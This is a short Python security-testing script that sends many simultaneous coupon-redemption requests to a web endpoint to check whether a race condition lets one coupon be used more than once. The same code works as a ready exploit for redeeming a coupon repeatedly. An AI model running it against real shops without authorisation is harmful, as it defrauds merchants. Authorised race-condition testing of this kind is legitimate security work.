#!/usr/bin/env python3
"""
Race Condition Tester
Usage: python race_tester.py https://target.com/redeem -c 20
"""

import sys
import requests
import concurrent.futures

class RaceTester:
    def __init__(self, url, coupon_code):
        self.url = url
        self.coupon = coupon_code
        self.success_count = 0
        
    def redeem(self, attempt):
        """Attempt to redeem"""
        try:
            r = requests.post(self.url, 
                            data={'code': self.coupon},
                            timeout=10)
            if r.status_code == 200:
                return {'attempt': attempt, 'success': True}
        except:
            pass
        return {'attempt': attempt, 'success': False}
    
    def test(self, num_requests=20):
        """Test for race condition"""
        print(f"[*] Testing race condition with {num_requests} concurrent requests...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
            futures = [executor.submit(self.redeem, i) for i in range(num_requests)]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result['success']:
                    self.success_count += 1
        
        print(f"[*] Success count: {self.success_count}/{num_requests}")
        
        if self.success_count > 1:
            print("[!] Race condition found - coupon can be reused!")
        elif self.success_count == 1:
            print("[*] Coupon works once (normal)")
        else:
            print("[*] Coupon doesn't work")
        
        return self.success_count


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='URL to test')
    parser.add_argument('-c', '--count', type=int, default=20, help='Number of requests')
    parser.add_argument('--code', default='SAVE20', help='Coupon code')
    args = parser.parse_args()
    
    tester = RaceTester(args.url, args.code)
    tester.test(args.count)


if __name__ == "__main__":
    main()